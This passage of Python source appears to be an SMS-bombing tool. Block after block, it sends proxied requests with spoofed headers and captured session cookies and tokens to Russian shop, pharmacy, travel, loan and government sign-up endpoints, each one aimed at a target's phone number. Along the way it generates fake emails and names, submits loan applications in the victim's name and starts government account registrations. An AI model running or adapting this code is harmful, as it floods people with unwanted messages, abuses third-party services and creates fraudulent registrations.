                'Cookie': 'gulliver_session=cL6HDZN0bcKhtksWvCwFQJpwy58KLkAgzHGnfX56; advcake_track_id=5a31566b-6387-bbd1-3c4e-14155399cef8; advcake_session_id=c4ffe14b-640a-9160-4733-a21d0f6fd6ab; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; mgo_uid=ZAZgCnpfZdopwKpftcSS',
                'Host': 'www.gulliver.ru',
                'Origin': 'https://www.gulliver.ru',
                'Referer': 'https://www.gulliver.ru/brands/gulliver',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            r = requests.post('https://www.gulliver.ru/api/authorization/phone/token', headers=header, proxies=proxy_2)
            token0 = json.loads(r.text)
            token = token0['data']['token']

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '696',
                'Content-Type': 'application/json;charset=UTF-8',
                'Cookie': 'gulliver_session=cL6HDZN0bcKhtksWvCwFQJpwy58KLkAgzHGnfX56; advcake_track_id=5a31566b-6387-bbd1-3c4e-14155399cef8; advcake_session_id=c4ffe14b-640a-9160-4733-a21d0f6fd6ab; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; mgo_uid=ZAZgCnpfZdopwKpftcSS',
                'Host': 'www.gulliver.ru',
                'Origin': 'https://www.gulliver.ru',
                'Referer': 'https://www.gulliver.ru/brands/gulliver',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {
                "agree_with_new_loyalty": "on",
                "birthdate": "12-12-2000",
                "email": "023rjjfj_ww@hotmail.com",
                "name": "Вася",
                "password": "Hoho_HO123",
                "password_repeat": "Hoho_HO123",
                "phone": num2,
                "sex": "male",
                "token": token
            }

            requests.post(
                'https://www.gulliver.ru/api/registration/phone/code_request',
                json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==',
                'origin': 'https://spb.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://spb.uteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'version': 'b835b033'
            }

            payload = {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode",
                       "params": {"phone": number[1:], "mustExist": False, "sendRealSms": True}}

            requests.post('https://spb.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'authorization': 'Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn',
                'content-length': '220',
                'content-type': 'application/json',
                'origin': 'https://elementaree.ru',
                'referer': 'https://elementaree.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            payload = {"operationName": "phoneVerification", "variables": {"phone": number},
                       "query": "mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone) {\n    success\n    interval\n    __typename\n  }\n}\n"}

            requests.post('https://api-new.elementaree.ru/graphql', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Client': 'angular_web_0.0.2',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'text/plain',
                'Cookie': 'qrator_msid=1667526234.775.XKeTKEPsW4ov4g4D-6qn2qar0j8pjc4gatudrriv26nb4dhqp; Utk_DvcGuid=50e83205-9a55-845c-3d3e-363cdc1925e4; Utk_SessionToken=3928A6E837779529C395A626B52E49E2; User_Agent=Mozilla%2F5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36; Is_Search_Bot=false; Utk_MrkGrpTkn=1FCF76D07C49A5ED62F64683C21656E9; agree_with_cookie=true; Utk_SssTkn=3928A6E837779529C395A626B52E49E2',
                'Deviceid': '50e83205-9a55-845c-3d3e-363cdc1925e4',
                'Host': 'moscow.online.lenta.com',
                'Origin': 'https://moscow.online.lenta.com',
                'Referer': 'https://moscow.online.lenta.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'SessionToken': '3928A6E837779529C395A626B52E49E2',
                'User-Agent': user,
                'x-domain': 'moscow',
                'x-retail-brand': 'lo'
            }

            payload = {"method": "authCodeSend", "params": {"phone": number}, "jsonrpc": "2.0", "id": 12}

            requests.post('https://moscow.online.lenta.com/jrpc', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'access_token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI2OTZjMWI5Zi0xZzQ1LTQ1OWEtYmVhNC0xMTEwNjhmYWNkYTgiLCJpYXQiOjE2Njc1MjY0NzEsInN1YiI6ImNoZWNrbWFpbF91c2VyIiwibGV2ZWwiOjIwLCJpc3MiOiJBdWNoYW4ucnUiLCJleHAiOjE2NzUzMDI0NzF9.9Fgzk9RrWW82n5F2uUggsAyBuZHc_fqWZp-GOxph5qk',
                'Connection': 'keep-alive',
                'Cookie': 'qrator_jsr=1667526415.893.MfERRj629UrSfHpf-8rtud06upbosderhvl5g1ef3390ea0d5-00; qrator_jsid=1667526415.893.MfERRj629UrSfHpf-jm7luqtsup8el3ol2j60phv7fkan9i6u; qrator_ssid=1667526416.258.OYUlKh0aP6DY18Jw-u4fv9j20mlns9csfk011vboa84jsc382; isEreceiptedPopupShown_=true; ab_test_popup_delivery=test_group; motopopupforeveryone=1; isAddressPopupShown_=true; region_id=1; merchant_ID_=1; methodDelivery_=1; _GASHOP=001_Mitishchi; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; tmr_lvid=1af3ad7f44323452a463acb0f7f4e6ba; tmr_lvidTS=1667526432573; _ym_uid=166752643344618027; _ym_d=1667526433; kameleoonVisitorCode=_js_dq2tzq3u66bvzpow; rrpvid=149419622442899; _userGUID=0:la1u6mdr:Ks5DPIpdJXdMpsJ2bfqnyt6SX4WcJDpg; dSesn=36d4984e-ef17-39b9-6c97-f9b8134436c1; _dvs=0:la1u6mdr:OwFvRPS2gUvDudZhy0uiDpFn6wuQj3Eh; _ym_isad=2; rcuid=63646f12e2746a93f2420567; haveChat=true; tmr_detect=0%7C1667526435285; device_id=206053908846.45267; tmr_reqNum=5',
                'Host': 'www.auchan.ru',
                'phone': number,
                'Referer': 'https://www.auchan.ru/auth/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'source': '4',
                'User-Agent': user
            }

            requests.get('https://www.auchan.ru/v1/cmd/clientprofile/checkphone', headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '141',
                'content-type': 'application/json',
                'cookie': '_ga=GA1.2.2080011146.1667526756; _gid=GA1.2.846099629.1667526756; _gat=1; _ym_uid=16675267561046031971; _ym_d=1667526756; _ym_visorc=w; _ym_isad=2; XSRF-TOKEN=eyJpdiI6ImZZTjluOFkrNnZZcGp2ZmN1ckQ2aWc9PSIsInZhbHVlIjoibVRsUDFwb0FlMGt4U2p3dW02UXRLb0o4U3hyNTZIeWJPNWxGbWJhWlhHWm1NK05RaWtsbjhOUWM2VFVrcmo1UWV4eHBzMWJEbnh2OXRJUVBObmFvU2c9PSIsIm1hYyI6ImQ3YmY0ZjI5M2U5ODVkZDNkMzY4MjRiZDBiYjMzNDA0NzZiMTIzZjVmODZiMzA4NmU0N2U0ZmVhYmQ5MWIzNjAifQ%3D%3D; victorialk_session=eyJpdiI6Im02RnkzdThaZmI0RTJZVktJZWt0UkE9PSIsInZhbHVlIjoiWVJSd3g0WFV1bHFvcTFCVFFWTmtXWElKNFBmeHBreWZRMEIxNzhhNUxlSjFybW4wS1VqSU5ZQlFqVEt2V2Y0RVVsUnpyZzZqWTJXUmtoZzRkRlladEE9PSIsIm1hYyI6ImE4NDQ2NDUyMmE2ODliMzNiM2ExZmFjODE1MWI1ZTZjNWNlNmQ4N2NlODU0OWYxMjY3MzU2YWYyODAwYzk4NGUifQ%3D%3D',
                'origin': 'https://lk.victoria-group.ru',
                'referer': 'https://lk.victoria-group.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': 'FSP8p7pYb7YwNMG71KtkOOsC5WSJpcUwNohCfKHA'
            }

            payload = "{\"MobilePhone\":\"+" + number + "\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":0,\"DeviceId\":\"gl3llll8mih00hxy1xg6j23c\"}"

            requests.post(
                'https://lk.victoria-group.ru/identity/registration', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '135',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'PHPSESSID=aYfHl3PCi7BeUusGZoTbM4ifURd4nZQQ; BITRIX_SM_GUEST_ID=42144878; BITRIX_SM_LAST_VISIT=04.11.2022+19%3A38%3A32; BITRIX_SM_SALE_UID=72a9489c1aabb0fde5da4bcb2ddea0c6; region_obl_id=17; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A7%2C%22EXPIRE%22%3A1667595540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',
                'origin': 'https://zdesapteka.ru',
                'referer': 'https://zdesapteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'userPhone': num2,
                'checkWord': '2QI6HY}h%YHc9Mxa6QOmC8htR5',
                'repeat': '0',
                'SITE_ID': 's1',
                'sessid': 'ea30ca83acb3852c7ab2b205a470b4c6'
            }

            requests.post(
                'https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode',
                data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': '_cfuvid=niRXx8FEscDdwEZcbQBkuUsNaKKENY758SgtDB57zoA-1667585854597-0-604800000; favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; searchPlaceholder=%25D0%25A3%25D1%2586%25D0%25B5%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5%2520%25D1%2581%25D0%25BC%25D0%25B0%25D1%2580%25D1%2582%25D1%2584%25D0%25BE%25D0%25BD%25D1%258B; __cf_bm=aBYWEoj8cSOBrcje9oCzroNpBVWTD0qYy_avyt1ea2g-1667590182-0-AXB6r6+dn1ulF7849ULVkAdvlQwYGsG9o4/7Hke1yzaI5xD+kHzm18NsHRU8UJFr6pkbrkJ8T3F8ZEdq0ZzXRfOjH8NTmifBlC1B+icPKgWuyiBpmhdLKZPy669t6TZkTocJNii2TX87IZjN0ER0Tcu9YAtHYnErIk5enhaa9K7lOL6VPE4p+wtDuJkSx7rTOA==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{number[1:]}', headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'cache-control-version': '527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f',
                'content-length': '38',
                'content-type': 'application/json',
                'cookie': 'referrer_first=dir; referrer_hist=dir; referrer=; accept_language=ru; abst=test_a; vid=b13a31d4-2feb-49e0-8f7d-a33aface1476; rm=758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249; sid=g0v+9sLViCLWl3Koz3ws/AwH; ENVID=production-a|Y2VvQ',
                'origin': 'https://www.onetwotrip.com',
                'referer': 'https://www.onetwotrip.com/ru/p/account',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-ott-cookie': ''
            }

            payload = {
                "phone": "+" + number,
                "reseller": ""
            }

            requests.patch(
                'https://www.onetwotrip.com/_auth/profile/phone/with-confirm', json=payload, headers=header,
                proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Host': 'id.x5.ru',
                'Connection': 'keep-alive',
                'Content-Length': '62',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'Content-Type': 'text/plain;charset=UTF-8',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': user,
                'sec-ch-ua-platform': '"Windows"',
                'Accept': '*/*',
                'Origin': 'https://id.x5.ru',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://id.x5.ru/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Cookie': 'ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; NSC_je_djq_l8t_31443_IUUQT_OB_WT=ffffffffc3a06eea45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; TS9f472ee0027=08549da071ab200080e88c8e8e79e0a43eec4808dc4dbf3994e4c7202a42afcb9ff6e8076bae3b9a083c8fa200113000306ff3aaede77deedd6aa63205e1b29bbdaf2a4c116f66a0c6d4cefe4d22b0b7ba3d19b0aaa7c1d572af87f3342ab1a8'
            }

            payload = {"query": "{ user_credentials(login:\"" + number + "\") {login}}"}

            requests.post('https://id.x5.ru/graphql', json=payload, headers=header, proxies=proxy_2)

            header = {
                'Host': 'id.x5.ru',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Cookie': f'AUTH_SESSION_ID=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; AUTH_SESSION_ID_LEGACY=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; TS011f02d7=01a93f754761231efd74e3f1bc015aef76f6b41547c2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a715a7a8bb3c6ad1dcd9b67582d8df48fd8f8552a5708f6d529090241346b5b9394f59e54e3e3ac9ba846810106dc79dd2a5948f9a0ae79f8ccd5359726c54685e1c92736c1249661e86bbbdca5deae36a5f9dbab518e52b0978ba1464a5e28d65132783f29cad08085178b3c1df53330; TS01a01a08=01a93f7547b2ffba6af8adcef0b38f12c0669903efc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60aa1b652b97a98d0b3af6d12de55d1f35e2319dbd39c047a742f2e8e74069de664f82800cb7876ba8fbd385e9c3b65d0df416ca669d31d0ce785cc787fc30f754ee2cc4629ca8079708cff99e1301a8528; ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; loginHint={number}; recaptcha_token=undefined; recaptcha_enable=false; recaptcha_hidden=false; recaptcha_pkey=6Lchf7MaAAAAAHbkxKLpB18bW27aP6JHw9Vi9ryd; ym_enable=true; ym_account_code=83748952; theme=scan-go; theme_idp=; action=register; UDI_1=rzfA5DILPx5i; UDI_2=b5MB94pzaA%3D%3D; TS9f472ee0027=08549da071ab20005a71cf8b4dbd7ccf36ba534867106999e5a7d74dfe5a333e46de8b528869c35c08611e2f66113000e9ceba28e645960145de1e7ee7439deaae9b3cc0da32656772de534296faf9268fa62aeaec39477b613092f92e71c65d'
            }

            requests.get(
                'https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/registrations?client_id=scan-go&redirect_uri=https%3A%2F%2Fid.x5.ru%2Fsuccess&state=7d96c6bf-1450-4153-be7e-c70261f56f74&response_mode=fragment&response_type=code&scope=openid%20offline_access&nonce=e9397d57-9fdd-4f8b-a251-a6f27908f064&ui_locales=ru',
                headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7({}{}{}){}{}{}{}".format(number[1], number[2], number[3], number[4], number[5], number[6], number[7]+number[8]+number[9]+number[10])

            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
            lib2 = [
                '@gmail.com',
                '@hotmail.com',
                '@yahoo.com',
                '@yandex.ru'
            ]
            email = ''
            for i in range(random.randint(8, 27)):
                email += random.choice(lib)
            email += random.choice(lib2)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Length': '121',
                'Content-Type': 'application/json',
                'Cookie': 'c_Rm3zyGZZScjt=68ECA43FE3B1877E264408431DC87AE1; c_Rm3zyGZZScjt_2=5090; c_Rm3zyGZZScjt_3=1762777891; fhp=rBBoEGNld1ScuxwtwuvvAg==; cox_id=ffffffffaf18760145525d5f4f58455e445a4a423660; defaultLocale=fr; srv_id=ec27836394f5c7031fa5a6a9ada4f64f; JSESSIONID=4216888F567E32D22B661B6D8A59C09C; ESIA_SESSION=dba8a9d2-a71a-41aa-b047-0cd00ce1d70a; sso_segment=oauth; __gsac_gib-w-gosuslugi=9b51a7b2-11e9-9546-6562-08ee6cdd6df8; __gsac_gib-w-gosuslugi=9b51a7b2-11e9-9546-6562-08ee6cdd6df8; usi_portal=rBooj2Nld1dtAG3RCVpoAg==; __zzatgib-w-gosuslugi=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VrTXdcdF53W3dWcDRqYVhDOmgdTRwaSk5fbxt7Il8qCCRjNV8ZQ2pODWk3XBQ8dWU+R3N6LkRpHWdQWSVKUT9IXl1JEjJiEkBATUcNN0BeN1dhMA8WEU1HFT1WUk9DKGsbcVgw03W1YQ==; __zzatgib-w-gosuslugi=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VrTXdcdF53W3dWcDRqYVhDOmgdTRwaSk5fbxt7Il8qCCRjNV8ZQ2pODWk3XBQ8dWU+R3N6LkRpHWdQWSVKUT9IXl1JEjJiEkBATUcNN0BeN1dhMA8WEU1HFT1WUk9DKGsbcVgw03W1YQ==; REG_CTX=c0f3ae8f-883f-40cd-84d6-04838ce21224; cfidsgib-w-gosuslugi=Y54VkhUlWa+EP5BtRLCv5BRPo9uypSiW+89DbRh3mcCKnLN9OXCQivLOn0EiTJl+kZHvh/TwPiVtmaF6yHqBYoBZacnb82IXoVHkWZX+R/B4MMGlllLYfBqc07Zyt8L0XVNQUrp92kp04PtCzeM+H7528G5TnCaj01yk; cfidsgib-w-gosuslugi=Y54VkhUlWa+EP5BtRLCv5BRPo9uypSiW+89DbRh3mcCKnLN9OXCQivLOn0EiTJl+kZHvh/TwPiVtmaF6yHqBYoBZacnb82IXoVHkWZX+R/B4MMGlllLYfBqc07Zyt8L0XVNQUrp92kp04PtCzeM+H7528G5TnCaj01yk; gsscgib-w-gosuslugi=Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ==; gsscgib-w-gosuslugi=Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ==; fgsscgib-w-gosuslugi=hUuR4fa26748071a91d90cf6b64349853a1743e4; fgsscgib-w-gosuslugi=hUuR4fa26748071a91d90cf6b64349853a1743e4',
                'Host': 'esia.gosuslugi.ru',
                'Origin': 'https://esia.gosuslugi.ru',
                'Referer': 'https://esia.gosuslugi.ru/login/registration',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-GIB-FGSSCgib-w-gosuslugi': 'hUuR4fa26748071a91d90cf6b64349853a1743e4',
                'X-GIB-GSSCgib-w-gosuslugi': 'Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ=='
            }

            payload = {
                'email': email,
                'first_name': 'Потанин',
                'last_name': 'Василий',
                'phone': num2
            }

            requests.post('https://esia.gosuslugi.ru/registration_api/user-data', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
            lib2 = [
                '@gmail.com',
                '@hotmail.com',
                '@yahoo.com',
                '@yandex.ru'
            ]
            email = ''
            for i in range(random.randint(8, 27)):
                email += random.choice(lib)
            email += random.choice(lib2)

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '368',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': '__ddg1_=7adIg7X1SQ3s1sqTbKQz; PHPSESSID=a840033f0d2b10e34442f83013bb3f0f; partner=zseo',
                'origin': 'https://borrow.zaymigo.com',
                'referer': 'https://borrow.zaymigo.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"jsonrpc": "2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create", "params": {
                "borrower": {"surname": "Пупкин", "name": "Василий", "patronymic": "Андреевич",
                             "patronymicNotExists": False, "phone": "+" + number, "email": email, "phoneParams": []},
                "term": 12, "amount": 10000, "agreements": [{"name": "assignment_of_claims", "val": True}]}}

            requests.post('https://borrow.zaymigo.com/rpc/v1', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num = number
            num2 = num[1] + num[2] + num[3]
            num3 = num[4] + num[5] + num[6]
            num4 = num[7] + num[8]
            num5 = num[9] + num[10]

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Cookie': 'JSESSIONID=s1~E49FFD68DAD12AC94BD1879CDD6E58BA; YOTA_SITE_VISITED=true; INITIAL_REFERER=direct; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=ru_RU; YOTA_REGION_CODE=O_75; NSC_xxx.zpub.sv-mcwt-iuuq-8079=ffffffff093b421945525d5f4f58455e445a4a4229bf; _ym_uid=1667594839288723167; _ym_d=1667594839; tmr_lvid=b4bc9fec2e063fa03e51fc100df9d272; tmr_lvidTS=1667594839035; _ym_visorc=b; _ym_isad=2; analytic_id=1667594840855704; REGION_APPROVED=true; _ga=GA1.2.165495858.1667594861; _gid=GA1.2.201805399.1667594861; LFR_SESSION_STATE_10161=1667594886294; tmr_detect=0%7C1667594888285; tmr_reqNum=19',
                'Host': 'www.yota.ru',
                'Referer': 'https://www.yota.ru/voice/order-sim',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
